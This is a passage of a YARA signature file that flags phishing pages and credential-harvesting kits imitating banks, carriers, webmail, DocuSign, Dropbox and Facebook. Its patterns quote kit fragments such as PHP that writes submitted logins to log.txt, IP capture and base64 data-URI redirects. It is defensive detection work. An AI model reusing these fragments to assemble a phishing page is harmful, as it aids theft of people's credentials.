        $trigger = "<title>Compra Premiada Ourocard e Cielo</title>"
    condition:
        $trigger
}

rule html_phishing_cielo_002 : phishing
{
    strings:
        $trigger = "Cielo: Nada supera essa m\xc3\x83\xc2\xa1quina | Cielo.com"
    condition:
        $trigger
}

rule html_phishing_cielo_002_002 : phishing
{
    strings:
        $trigger = "Cielo na Copa 2014 - Cadastre - se! 20 Mi"
    condition:
        $trigger
}

private rule PR00351 : trigger
{
    strings:
        $ps0 = "<div class='headingTXT'>citibank Online TT(CURRENCY : US DOLLARS)</div></TD>"
    condition:
        $ps0
}

rule html_phishing_citibank_001 : phishing
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR00351
}

rule html_phishing_citibank_002 : phishing
{
    strings:
        $trigger = "Citigroup Inc.<"
    condition:
        $trigger and PR00042
}

private rule PR00352 : trigger
{
    strings:
        $ps0 = "Citizens Financial Group, Inc"
    condition:
        $ps0
}

private rule PR00353 : trigger
{
    strings:
        $ps0 = "Bank"
    condition:
        $ps0
}

rule html_phishing_citizens_bank_001 : phishing
{
    strings:
        $trigger = "Online"
    condition:
        $trigger and PR00352 and PR00353
}

private rule PR00354 : trigger
{
    strings:
        $ps0 = "<TITLE>COMCAST Webmail</TITLE>"
    condition:
        $ps0
}

rule html_phishing_comcast_001 : phishing
{
    strings:
        $trigger = "<HTML"
    condition:
        $trigger and PR00354
}

rule html_phishing_comcast_002 : phishing
{
    strings:
        $trigger = "<title>Sign in to XFINITY"
    condition:
        $trigger
}

rule html_phishing_comcast_002_02 : phishing
{
    strings:
        $trigger = "mation Credit Card XFINITY</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_comcast_002_03 : phishing
{
    strings:
        $trigger = "<title>Sign in to Xfinity</title>"
    condition:
        $trigger
}

rule html_phishing_comcast_003 : phishing
{
    strings:
        $trigger = "<title>Sign in to Comcast</title>"
    condition:
        $trigger
}

rule html_phishing_comcast_004 : phishing
{
    strings:
        $trigger = "Comcast Corporation<"
    condition:
        $trigger and PR00042
}

private rule PR00355 : trigger
{
    strings:
        $ps0 = "fwrite"
    condition:
        $ps0
}

private rule PR00356 : trigger
{
    strings:
        $ps0 = "<Chronopost@correos.es>"
    condition:
        $ps0
}

private rule PR00357 : trigger
{
    strings:
        $ps0 = "fopen"
    condition:
        $ps0
}

rule html_phishing_correos_001 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR00356 and PR00357
}

rule html_phishing_costco_001 : phishing
{
    strings:
        $trigger = "<title>costcosupply"
    condition:
        $trigger
}

rule html_phishing_cox_001 : phishing
{
    strings:
        $trigger = "<title>Sign In to Your Cox Account"
    condition:
        $trigger
}

private rule PR00358 : trigger
{
    strings:
        $ps0 = "<form novalidate id=\"login_form\" action=\""
    condition:
        $ps0
}

private rule PR00359 : trigger
{
    strings:
        $ps0 = "cPanel"
    condition:
        $ps0
}

rule html_phishing_cPanel_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00358 and PR00359
}

private rule PR00360 : trigger
{
    strings:
        $ps0 = "go.cpanel.net/privacy"
    condition:
        $ps0
}

rule html_phishing_cPanel_003 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00360 and PR00359
}

rule html_phishing_credit_lyonnais_001 : phishing
{
    strings:
        $trigger = "<title>LCL - Le Cr&egrave;dit Lyonnais</title>"
    condition:
        $trigger
}

rule html_phishing_credit_mutuel_001 : phishing
{
    strings:
        $trigger = "<title>Cr\xc3\xa9dit Mutuel de Bretagne"
    condition:
        $trigger
}

rule html_phishing_credit_mutuel_001_02 : phishing
{
    strings:
        $trigger = "<title>Banque et assurance"
    condition:
        $trigger
}

rule html_phishing_creditagricole_001 : phishing
{
    strings:
        $trigger = " - Banque en Ligne - Accueil - Particuliers</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_creditagricole_002 : phishing
{
    strings:
        $trigger = "dit Agricole</title>"
    condition:
        $trigger and PR00042
}

private rule PR00361 : trigger
{
    strings:
        $ps0 = "www.creditmutuel.fr/cmcee/fr/css"
    condition:
        $ps0
}

rule html_phishing_creditmutuel_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00361
}

rule html_phishing_daum_001 : phishing
{
    strings:
        $trigger = "<title>Daum"
    condition:
        $trigger and PR00281
}

private rule PR00362 : trigger
{
    strings:
        $ps0 = "mailto:support@dba.dk"
    condition:
        $ps0
}

private rule PR00363 : trigger
{
    strings:
        $ps0 = "dataLayer.push("
    condition:
        $ps0
}

rule html_phishing_dba_001 : phishing
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR00362 and PR00363
}

rule html_phishing_delta_001 : phishing
{
    strings:
        $trigger = "Delta Air Lines, Inc"
    condition:
        $trigger and PR00042
}

rule html_phishing_desjardins_001 : phishing
{
    strings:
        $trigger = "| Desjardins</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_desjardins_002 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;URL='https://www.desjardins.com/"
    condition:
        $trigger and PR00301
}

private rule PR00364 : trigger
{
    strings:
        $ps0 = "<title>DHL EXPRESS"
    condition:
        $ps0
}

rule html_phishing_dhl_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00364
}

rule html_phishing_dhl_003_02 : phishing
{
    strings:
        $trigger = ">DHL |"
        $html_phishing_dhl_003_02_w0 = "Sistemas CASA"
    condition:
        $trigger and PR00042 and not $html_phishing_dhl_003_02_w0
}

rule html_phishing_dhl_003_03 : phishing
{
    strings:
        $trigger = ">DHL World"
        $html_phishing_dhl_003_03_w0 = "Sistemas CASA"
    condition:
        $trigger and PR00042 and not $html_phishing_dhl_003_03_w0
}

private rule PR00365 : trigger
{
    strings:
        $ps0 = "<title>DHI EXPRESS"
    condition:
        $ps0
}

rule html_phishing_dhl_004 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00365
}

private rule PR00366 : trigger
{
    strings:
        $ps0 = "<title>Verified</title>"
    condition:
        $ps0
}

rule html_phishing_dhl_005 : phishing
{
    strings:
        $trigger = "bitcoin"
    condition:
        $trigger and PR00366
}

rule html_phishing_dhl_006 : phishing
{
    strings:
        $trigger = "data-tracking=\"{'type':'dhlTopNavMenuGuest','title':{'en': 'My dhl home'}}\" link-text=\"MyDHL+ Home\">"
    condition:
        $trigger and PR00042 and PR00281
}

private rule PR00367 : trigger
{
    strings:
        $ps0 = "<title>|"
    condition:
        $ps0
}

rule html_phishing_dhl_007 : phishing
{
    strings:
        $trigger = "<li>DHL"
    condition:
        $trigger and PR00367
}

rule html_phishing_discover_001 : phishing
{
    strings:
        $trigger = "\\u0044\\u0069\\u0073\\u0063\\u006F\\u0076\\u0065\\u0072\\u0020\\u0043\\u0061\\u0072\\u0064\\u003A\\u0020\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065"
    condition:
        $trigger and PR00224
}

rule html_phishing_discover_002 : phishing
{
    strings:
        $trigger = "<title>Discover Card Account Center Login"
    condition:
        $trigger
}

rule html_phishing_discover_003 : phishing
{
    strings:
        $trigger = "<title>Discover Card: Your Card Has Been Verified</title>"
    condition:
        $trigger
}

private rule PR00368 : trigger
{
    strings:
        $ps0 = "content=\"0; URL=data:text/html;base64,77u/CjwhZG9jdHlwZSBodG1sIHB1YmxpYyAgIi0vL1"
    condition:
        $ps0
}

rule html_phishing_discover_004 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00368
}

rule html_phishing_discover_005 : phishing
{
    strings:
        $trigger = "Discover Bank"
    condition:
        $trigger and PR00042
}

rule html_phishing_discover_006 : phishing
{
    strings:
        $trigger = "<title>Discover Card Login, Discover Credit Card Login"
    condition:
        $trigger
}

private rule PR00369 : trigger
{
    strings:
        $ps0 = "<TITLE>Discover Card: Cardmember Verification Page</TITLE>"
    condition:
        $ps0
}

rule html_phishing_discovery_001 : phishing
{
    strings:
        $trigger = "<HTML"
    condition:
        $trigger and PR00369
}

rule html_phishing_disney_001 : phishing
{
    strings:
        $trigger = "<title>Disney.com |"
    condition:
        $trigger and PR00281
}

rule html_phishing_docusign_001 : phishing
{
    strings:
        $trigger = "<title>Docusign"
    condition:
        $trigger
}

rule html_phishing_docusign_001_02 : phishing
{
    strings:
        $trigger = "Docusign<"
    condition:
        $trigger and PR00042
}

private rule PR00370 : trigger
{
    strings:
        $ps0 = "<title>Sign In - DocuSign</title>"
    condition:
        $ps0
}

rule html_phishing_docusign_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00370
}

rule html_phishing_docusign_003 : phishing
{
    strings:
        $trigger = "<title>DocuSign Free Trial </title>"
    condition:
        $trigger
}

rule html_phishing_docusign_003_02 : phishing
{
    strings:
        $trigger = ">DocuSign - Enter email to start log in</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_docusign_003_03 : phishing
{
    strings:
        $trigger = ">DocuSign Login - Enter your password to sign in</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_docusign_004 : phishing
{
    strings:
        $trigger = "<title>Encrypted Documents - Docusign"
    condition:
        $trigger
}

private rule PR00371 : trigger
{
    strings:
        $ps0 = "window.location"
    condition:
        $ps0
}

rule html_phishing_docusign_004_001 : phishing
{
    strings:
        $trigger = "online with 1&1 Webmail.\",\"oao.login.canonical\":\"https://webmail.1and1.co.uk"
    condition:
        $trigger and PR00371 and PR00050
}

rule html_phishing_docusign_005 : phishing
{
    strings:
        $trigger = "<title>&#68;&#111;&#99;&#117;&#115;&#105;&#103;&#110;"
    condition:
        $trigger
}

rule html_phishing_docusign_006 : phishing
{
    strings:
        $trigger = "[[year]] DocuSign"
    condition:
        $trigger and PR00042
}

rule html_phishing_dropbox_001 : phishing
{
    strings:
        $trigger = "<span>now , you can sign in to dropbox with all email providers.</span>"
    condition:
        $trigger and PR00247
}

// MANUAL FIX NECESSARY
rule html_phishing_dropbox_002 : phishing
{
    strings:
        $trigger = "<title"
        $html_phishing_dropbox_002_r0 = /<title>\s*[Dd]rop[Bb]ox\W+([BbUuSsIiNnEeSsSs]|[SsIiLlGgNn\s]){7,8}/
    condition:
        $trigger and $html_phishing_dropbox_002_r0
}

private rule PR00372 : trigger
{
    strings:
        $ps0 = "<title>Email Login</title>"
    condition:
        $ps0
}

rule html_phishing_dropbox_003 : phishing
{
    strings:
        $trigger = "<strong>Dropbox</strong>"
    condition:
        $trigger and PR00372
}

rule html_phishing_dropbox_006 : phishing
{
    strings:
        $trigger = "<title>Dropbox<"
    condition:
        $trigger
}

rule html_phishing_dropbox_007 : phishing
{
    strings:
        $trigger = "<title>Sign in -Dropbox</title>"
    condition:
        $trigger
}

rule html_phishing_dropbox_008 : phishing
{
    strings:
        $trigger = "<title>Dropbox - File Sharing Portal"
    condition:
        $trigger
}

private rule PR00373 : trigger
{
    strings:
        $ps0 = "<title>"
    condition:
        $ps0
}

rule html_phishing_dropbox_009 : phishing
{
    strings:
        $trigger = "Dropbox Business</title>"
    condition:
        $trigger and PR00301 and PR00373
}

rule html_phishing_dropbox_010 : phishing
{
    strings:
        $trigger = "<title>Login - Dropbox"
    condition:
        $trigger
}

rule html_phishing_dropbox_011 : phishing
{
    strings:
        $trigger = "<title>Dropbox"
    condition:
        $trigger
}

rule html_phishing_earthlink_001 : phishing
{
    strings:
        $trigger = "method=post onsubmit=\"return checkLogin()"
    condition:
        $trigger and PR00042 and PR00278
}

private rule PR00374 : trigger
{
    strings:
        $ps0 = "Welcome to eBay"
    condition:
        $ps0
}

rule html_phishing_ebay_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00374
}

rule html_phishing_ebay_002 : phishing
{
    strings:
        $trigger = "EBAY_SIGNIN"
    condition:
        $trigger and PR00042
}

private rule PR00375 : trigger
{
    strings:
        $ps0 = "bozur.net"
    condition:
        $ps0
}

rule html_phishing_ebay_003 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;"
    condition:
        $trigger and PR00375
}

rule html_phishing_ebay_004 : phishing
{
    strings:
        $trigger = ">Einloggen oder neu anmelden | eBay"
    condition:
        $trigger and PR00042
}

rule html_phishing_ebay_005 : phishing
{
    strings:
        $trigger = "&#x65;B&#x61;y&#x20;I&#x6e;c"
    condition:
        $trigger and PR00042 and PR00046
}

rule html_phishing_ec21_001 : phishing
{
    strings:
        $trigger = "<title>Sign-in :: EC21"
    condition:
        $trigger
}

private rule PR00376 : trigger
{
    strings:
        $ps0 = "#\">We need your E-mail password to verify your"
    condition:
        $ps0
}

rule html_phishing_email_account_001 : phishing
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00376
}

rule html_phishing_email_account_002 : phishing
{
    strings:
        $trigger = "alert(\"To complete the update, please enter your Email Password.\"); form.emailpassword."
    condition:
        $trigger
}

private rule PR00377 : trigger
{
    strings:
        $ps0 = "unitel.co.kr"
    condition:
        $ps0
}

private rule PR00378 : trigger
{
    strings:
        $ps0 = "<HTML"
    condition:
        $ps0
}

rule html_phishing_email_account_003 : phishing
{
    strings:
        $trigger = "&#47196;&#44536;&#51064;"
    condition:
        $trigger and PR00377 and PR00378
}

rule html_phishing_email_account_004 : phishing
{
    strings:
        $trigger = "Horde :: Log in"
    condition:
        $trigger and PR00042
}

rule html_phishing_email_account_005 : phishing
{
    strings:
        $trigger = "Coremail Professional Mail System"
    condition:
        $trigger and PR00042
}

rule html_phishing_email_account_006 : phishing
{
    strings:
        $trigger = "<title>Email Encryption</title>"
    condition:
        $trigger and PR00281
}

private rule PR00379 : trigger
{
    strings:
        $ps0 = "<title>&#x53;&#x69;&#x67;&#x6e;&#x20;&#x69;&#x6e;&#x20;&#x74;&#x6f;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;</title>"
    condition:
        $ps0
}

rule html_phishing_email_account_007 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00379 and PR00046
}

private rule PR00380 : trigger
{
    strings:
        $ps0 = "<title>Sign in"
    condition:
        $ps0
}

private rule PR00381 : trigger
{
    strings:
        $ps0 = "urldecode(base64_decode("
    condition:
        $ps0
}

rule html_phishing_email_account_008 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00380 and PR00046 and PR00381
}

private rule PR00382 : trigger
{
    strings:
        $ps0 = "&#x57;&#x65;&#x62;&#x20;&#x2D;&#x20;&#x4D;&#x61;&#x69;&#x6C;"
    condition:
        $ps0
}

rule html_phishing_email_account_009 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00382 and PR00046
}

rule html_phishing_emirates_adb_001 : phishing
{
    strings:
        $trigger = "<title>Emirates NDB"
    condition:
        $trigger
}

rule html_phishing_emirates_adb_002 : phishing
{
    strings:
        $trigger = "<title>BankNet</title>"
    condition:
        $trigger
}

private rule PR00383 : trigger
{
    strings:
        $ps0 = "<title>Formulario de reembolso electr\xc3\xb3nico</title>"
    condition:
        $ps0
}

rule html_phishing_endesa_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00383
}

private rule PR00384 : trigger
{
    strings:
        $ps0 = "<title>Confirmar su tarjeta</title>"
    condition:
        $ps0
}

rule html_phishing_endesa_001_02 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00384
}

rule html_phishing_endesa_002 : phishing
{
    strings:
        $trigger = "My Endesa"
    condition:
        $trigger and PR00042
}

private rule PR00385 : trigger
{
    strings:
        $ps0 = ">Etisalat - Personal - My Email"
    condition:
        $ps0
}

rule html_phishing_Etisalat_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00385
}

private rule PR00386 : trigger
{
    strings:
        $ps0 = "$ip = getenv("
    condition:
        $ps0
}

private rule PR00387 : trigger
{
    strings:
        $ps0 = "$msg ="
    condition:
        $ps0
}

private rule PR00388 : trigger
{
    strings:
        $ps0 = "window.location=\"https://onlineservices.etisalat.ae/scp/open/quickpayandrecharge/quickPayAndRecharge.jsp\""
    condition:
        $ps0
}

rule html_phishing_etisalat_002 : phishing
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR00301 and PR00387 and PR00388
}

rule html_phishing_facebook_001 : phishing
{
    strings:
        $trigger = "Welcome to Facebook - Log In, Sign Up or Learn More</title>"
    condition:
        $trigger and PR00247
}

private rule PR00389 : trigger
{
    strings:
        $ps0 = "<span class=\"bb bz\">Facebook &copy;"
    condition:
        $ps0
}

rule html_phishing_facebook_002 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00389
}

rule html_phishing_facebook_003 : phishing
{
    strings:
        $trigger = "<title>Welcome to Facebook"
    condition:
        $trigger
}

rule html_phishing_facebook_004 : phishing
{
    strings:
        $trigger = "title=\"Go to Facebook Home\">"
    condition:
        $trigger and PR00247
}

private rule PR00390 : trigger
{
    strings:
        $ps0 = "Log in to Facebook | Facebook</title>"
    condition:
        $ps0
}

rule html_phishing_facebook_005 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00390
}

rule html_phishing_facebook_006 : phishing
{
    strings:
        $trigger = "<title id=\"pageTitle\">Facebook"
    condition:
        $trigger and PR00281
}

private rule PR00391 : trigger
{
    strings:
        $ps0 = "_COOKIE"
    condition:
        $ps0
}

private rule PR00392 : trigger
{
    strings:
        $ps0 = "CURLOPT_RETURNTRANSFER"
    condition:
        $ps0
}

rule html_phishing_facebook_006_02 : phishing
{
    strings:
        $trigger = "if(preg_match('#/login/device-based/update-nonce/|/login/save-device/|checkpointSubmitButton|MCheckpointController#',"
    condition:
        $trigger and PR00391 and PR00392
}

private rule PR00393 : trigger
{
    strings:
        $ps0 = "$handle = fopen(\"log.txt\", \"a\");"
    condition:
        $ps0
}

rule html_phishing_facebook_007 : phishing
{
    strings:
        $trigger = "Location:"
    condition:
        $trigger and PR00393
}

rule html_phishing_facebook_008 : phishing
{
    strings:
        $trigger = "Welcome to Facebook<"
    condition:
        $trigger and PR00042
}

rule html_phishing_facebook_009 : phishing
{
    strings:
        $trigger = "Your Facebook account must be <strong>confirmed"
    condition:
        $trigger and PR00042
}

private rule PR00394 : trigger
{
    strings:
        $ps0 = "span> Facebook \xc2\xa9"
    condition:
        $ps0
}

rule html_phishing_facebook_010 : phishing
{
    strings:
        $trigger = "@fwrite("
    condition:
        $trigger and PR00042 and PR00394
}

rule html_phishing_facebook_011 : phishing
{
    strings:
        $trigger = "<title>Facebook Log in, FB Login,"
    condition:
        $trigger
}

private rule PR00395 : trigger
{
    strings:
        $ps0 = "<title>Facebook | Confirm identity"
    condition:
        $ps0
}

rule html_phishing_facebook_012 : phishing
{
    strings:
        $trigger = "Login"
    condition:
        $trigger and PR00395
}

rule html_phishing_facebook_013 : phishing
{
    strings:
        $trigger = ">Facebook Inc.</span>"
    condition:
        $trigger and PR00042 and PR00281
}

rule html_phishing_fastmail_001 : phishing
{
    strings:
        $trigger = "<title>Log In | FastMail</title>"
    condition:
        $trigger and PR00281
}

rule html_phishing_fido_001 : phishing
{
    strings:
        $trigger = "Fido-mobile.com</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_fido_002 : phishing
{
    strings:
        $trigger = "Fido.ca</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_fido_003 : phishing
{
    strings:
        $trigger = "Fido</title>"
    condition:
        $trigger and PR00042
}

rule html_phishing_FNB_001 : phishing
{
    strings:
        $trigger = "First National Bank - FNB</title>"
    condition:
        $trigger and PR00042 and PR00281
}

rule html_phishing_FNB_001_02 : phishing
{
    strings:
        $trigger = "<title>FNB - Internet Bank"
    condition:
        $trigger and PR00281
}

rule html_phishing_freerentalsite_001 : phishing
{
    strings:
        $trigger = "FreeRentalSite.com<"
    condition:
        $trigger and PR00042 and PR00046 and PR00251
}

private rule PR00396 : trigger
{
    strings:
        $ps0 = "Free Web Hosting - Subdomain And/Or Domain"
    condition:
        $ps0
}

rule html_phishing_freewebhosting_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00396
}

rule html_phishing_gaming_001 : phishing
{
    strings:
        $trigger = "<title>Login | Axie Infinity"
    condition:
        $trigger
}

rule html_phishing_gcash_001 : phishing
{
    strings:
        $trigger = "<title>GCash"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR00397 : trigger
{
    strings:
        $ps0 = "isset"
    condition:
        $ps0
}

private rule PR00398 : trigger
{
    strings:
        $ps0 = "include('gcash_logs.php');"
    condition:
        $ps0
}

rule html_phishing_gcash_002 : phishing
{
    strings:
        $trigger = "$_POST"
        $html_phishing_gcash_002_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR00397 and PR00398 and $html_phishing_gcash_002_r0
}

// MANUAL FIX NECESSARY
private rule PR00399 : trigger
{
    strings:
        $ps0 = "new GcashSettings;"
    condition:
        $ps0
}

rule html_phishing_gcash_002_02 : phishing
{
    strings:
        $trigger = "$_POST"
        $html_phishing_gcash_002_02_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR00399 and PR00397 and $html_phishing_gcash_002_02_r0
}

rule html_phishing_generic_002 : phishing
{
    strings:
        $trigger = "Send Money, Pay Online"
    condition:
        $trigger and PR00247
}

rule html_phishing_generic_003 : phishing
{
    strings:
        $trigger = "<h1>YOUR MAILBOX QUOTA HAVE BEEN SCHEDUELED FOR ADDITIONAL"
    condition:
        $trigger and PR00039
}

rule html_phishing_generic_004 : phishing
{
    strings:
        $trigger = "Welcome to NAB Internet Banking"
    condition:
        $trigger
}

rule html_phishing_generic_005 : phishing
{
    strings:
        $trigger = "Allied Direct Internet Banking"
    condition:
        $trigger
}

private rule PR00400 : trigger
{
    strings:
        $ps0 = "Elance: Please Sign In"
    condition:
        $ps0
}

rule html_phishing_generic_006 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00400
}

private rule PR00401 : trigger
{
    strings:
        $ps0 = "Log in to online banking"
    condition:
        $ps0
}

rule html_phishing_generic_007 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00401
}

rule html_phishing_generic_008 : phishing
{
    strings:
        $trigger = "NatWest Personal Banking - Mortgages, "
    condition:
        $trigger
}

private rule PR00402 : trigger
{
    strings:
        $ps0 = "\"TAM FIDELIDADE\";"
    condition:
        $ps0
}

rule html_phishing_generic_009 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00402
}

private rule PR00403 : trigger
{
    strings:
        $ps0 = " G00dLuck "
    condition:
        $ps0
}

rule html_phishing_generic_010 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00403
}

rule html_phishing_generic_011 : phishing
{
    strings:
        $trigger = "<title>Log in to Credit Card services</title>"
    condition:
        $trigger
}

rule html_phishing_generic_012 : phishing
{
    strings:
        $trigger = "<title>Internet banking"
    condition:
        $trigger
}

rule html_phishing_generic_013 : phishing
{
    strings:
        $trigger = "<title>Internet Banking"
    condition:
        $trigger
}

private rule PR00404 : trigger
{
    strings:
        $ps0 = ">Coordonn&eacute;es Bancaires"
    condition:
        $ps0
}

rule html_phishing_generic_014 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR00404
}

rule html_phishing_generic_015 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;url=http://www.mail.live.com\">"
    condition:
        $trigger
}

rule html_phishing_generic_016 : phishing
{
    strings:
        $trigger = "<input src=\"images/e-lcl.png\" alt=\"\" type=\"image\" title=\"\" border=0 width=101 height=40 name=\"submit\" value=\"submit\" formaction=\"full2"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_017 : phishing
{
    strings:
        $trigger = "<title>Online Banking - Your Details"
    condition:
        $trigger
}

rule html_phishing_generic_018 : phishing
{
    strings:
        $trigger = "<title>Internet Banking Logon Promo</title>"
    condition:
        $trigger
}

rule html_phishing_generic_019 : phishing
{
    strings:
        $trigger = "<title>Activate Internet Banking</title>"
    condition:
        $trigger
}

rule html_phishing_generic_020 : phishing
{
    strings:
        $trigger = "Credit Cards, Banking, Personal, Home and Student Loans<"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_021 : phishing
{
    strings:
        $trigger = ">Discover Card Account Number</font>"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_022 : phishing
{
    strings:
        $trigger = "CIBC Online Banking"
    condition:
        $trigger
}

rule html_phishing_generic_023 : phishing
{
    strings:
        $trigger = "<title>Welcome To Online Global TradeFile"
    condition:
        $trigger
}

rule html_phishing_generic_024 : phishing
{
    strings:
        $trigger = "--phishers ::: icq:"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_025 : phishing
{
    strings:
        $trigger = "<title>Bienvenido a BancaNet"
    condition:
        $trigger
}

rule html_phishing_generic_027 : phishing
{
    strings:
        $trigger = "<title>Portale Titolari"
    condition:
        $trigger
}

rule html_phishing_generic_028 : phishing
{
    strings:
        $trigger = "Banca March Bank"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_029 : phishing
{
    strings:
        $trigger = "<title>Standard Chartered Bank</title>"
    condition:
        $trigger
}

private rule PR00405 : trigger
{
    strings:
        $ps0 = "<TITLE>HiNet"
    condition:
        $ps0
}

rule html_phishing_generic_030 : phishing
{
    strings:
        $trigger = "<HTML"
    condition:
        $trigger and PR00405
}

private rule PR00406 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"refresh\" content=\"0; URL=data:text/html;base64,"
    condition:
        $ps0
}

rule html_phishing_generic_031 : phishing
{
    strings:
        $trigger = "PGh0bWw+DQo8SEVBRD4NCjxUSVRMRT5ESEwg"
    condition:
        $trigger and PR00406
}

private rule PR00407 : trigger
{
    strings:
        $ps0 = "DQoNCiZuYnNwOzxodG1sPg0KDQo8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwOyB1cmw"
    condition:
        $ps0
}

rule html_phishing_generic_031_02 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0; URL=data:text/html;base64,"
    condition:
        $trigger and PR00407
}

rule html_phishing_generic_031_03 : phishing
{
    strings:
        $trigger = "ZXQ9dXRmLTgiIC8+DQo8dGl0bGU+U2lnbiBJbjwvdGl0bGU+DQo8L2hlY"
    condition:
        $trigger and PR00406
}

rule html_phishing_generic_032 : phishing
{
    strings:
        $trigger = "<title>Tangerine bank"
    condition:
        $trigger
}

rule html_phishing_generic_033 : phishing
{
    strings:
        $trigger = "<title>NAB - Member Satisfaction Survey"
    condition:
        $trigger and PR00278
}

rule html_phishing_generic_034 : phishing
{
    strings:
        $trigger = "dynamic virtual keyboard"
    condition:
        $trigger and PR00042 and PR00278
}

rule html_phishing_generic_035 : phishing
{
    strings:
        $trigger = "<title>HBL Bank"
    condition:
        $trigger
}

rule html_phishing_generic_036 : phishing
{
    strings:
        $trigger = "=====|SPYUS|====="
    condition:
        $trigger and PR00246
}

rule html_phishing_generic_037 : phishing
{
    strings:
        $trigger = "document.write(unescape(\"%3Cbody%3E"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_038 : phishing
{
    strings:
        $trigger = ">e-Carte Bleue"
    condition:
        $trigger and PR00042
}

private rule PR00408 : trigger
{
    strings:
        $ps0 = ".live.com"
    condition:
        $ps0
}

rule html_phishing_generic_039 : phishing
{
    strings:
        $trigger = "type=\"image/vnd.microsoft.icon\" href=\"http://microsoft-excel."
    condition:
        $trigger and PR00408
}

rule html_phishing_generic_040 : phishing
{
    strings:
        $trigger = "<title>Form Page: excel</title>"
    condition:
        $trigger
}

rule html_phishing_generic_041 : phishing
{
    strings:
        $trigger = "document.write(unescape('%3c%74%69%74%6c%65%3e%45%6d%61%69%6c%20%53%65%74%74%69%6e%67%73%20%7c%20%56%65%72%69%66%69%63%61%74%69%6f%6e%3c%2f%74%69%74%6c%65%3e%0d%0a%0d%0a"
    condition:
        $trigger
}

private rule PR00409 : trigger
{
    strings:
        $ps0 = "input type=\"submit\" value=\"Update My Details\""
    condition:
        $ps0
}

rule html_phishing_generic_042 : phishing
{
    strings:
        $trigger = ".php\">"
    condition:
        $trigger and PR00042 and PR00409
}

rule html_phishing_generic_043 : phishing
{
    strings:
        $trigger = "content=\"Log in to your DocuSign account. DocuSign is the global standard for Digital Transaction Management\"><meta content=\"JavaScript"
    condition:
        $trigger and PR00042
}

rule html_phishing_generic_044 : phishing
{
    strings:
        $trigger = "<title>Welc&omicron;me"
    condition:
        $trigger
}

rule html_phishing_generic_045 : phishing
{
    strings:
        $trigger = "<title>L&omicron;gging"
    condition:
        $trigger
}

private rule PR00410 : trigger
{
    strings:
        $ps0 = "<title>Aguarde.."
    condition:
        $ps0
}

rule html_phishing_generic_046 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00410
}

private rule PR00411 : trigger
{
    strings:
        $ps0 = "Portal do cliente | Seja Bem-vindos"
    condition:
        $ps0
}

rule html_phishing_generic_047 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00411
}

rule html_phishing_generic_048 : phishing
{
    strings:
        $trigger = "\\x68\\x61\\x73\\x68\",\"\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E"
        $html_phishing_generic_048_w0 = "\\x42\\x4C\\x4F\\x47\\x20\\x53\\x54\\x41\\x52\\x54\\x53\\x20\\x48\\x45\\x52\\x45"
    condition:
        $trigger and PR00332 and not $html_phishing_generic_048_w0
}

rule html_phishing_generic_049 : phishing
{
    strings:
        $trigger = "<title>REALITYWORLD INC"
    condition:
        $trigger
}

private rule PR00412 : trigger
{
    strings:
        $ps0 = "<HEAD><TITLE>Synchronizing."
    condition:
        $ps0
}

